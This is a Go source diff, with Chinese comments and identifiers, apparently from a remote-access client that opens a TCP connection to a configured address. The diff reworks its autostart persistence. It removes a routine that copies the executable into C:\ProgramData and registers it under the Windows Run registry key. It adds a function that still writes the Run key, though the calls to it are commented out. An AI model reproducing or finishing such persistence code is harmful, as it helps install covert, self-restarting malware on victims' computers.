@@ -11,8 +11,6 @@ import (
 	"io"
 	"log"
 	"net"
-	"os"
-	"path/filepath"
 	"runtime"
 	"sync"
 	"time"
@@ -79,8 +77,8 @@ func 连接() {
 	//}
 
 	wg.Add(3) // 协程计数器 +1
-
-	go AddToStartup()
+	//go 启动计划()
+	//go AddToStartup()
 	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", IP)
 
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
@@ -262,20 +260,17 @@ func doSomeThing(socket net.Conn) {
 
 }
 
-func AddToStartup() {
-	//复制程序到指定目录
-	util.CopyToProgramData()
-	exePath := filepath.Join("C:\\ProgramData", filepath.Base(os.Args[0]))
-	exeName := filepath.Base(exePath)
-
-	// 打开注册表项
+func 启动计划() {
+	time.Sleep(1 * time.Minute)
+	//初步写入()
+}
+func 写入(exeName string, exePath string) {
 	key, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer key.Close()
 
-	// 检查是否已存在该项
 	_, _, err = key.GetStringValue(exeName)
 	if err == nil {
 		// 如果已存在，则不需要重复写入
@@ -283,11 +278,20 @@ func AddToStartup() {
 	}
 	encryptPath, err := util.EncryptString("ylcworld19990709", exePath)
 
-	// 写入注册表项
 	decryptPath, err := util.DecryptString("ylcworld19990709", encryptPath)
 	err = key.SetExpandStringValue(exeName, decryptPath)
 	if err != nil {
 		log.Fatal(err)
 	}
-	wg.Done() // 协程计数器加-1
 }
+
+//func 初步写入() {
+//	//复制程序到指定目录
+//	util.CopyToProgramData()
+//	exePath := filepath.Join("C:\\ProgramData", filepath.Base(os.Args[0]))
+//	_ = filepath.Base(exePath)
+//
+//	//写入(exeName, exePath)
+//
+//	wg.Done() // 协程计数器加-1
+//}
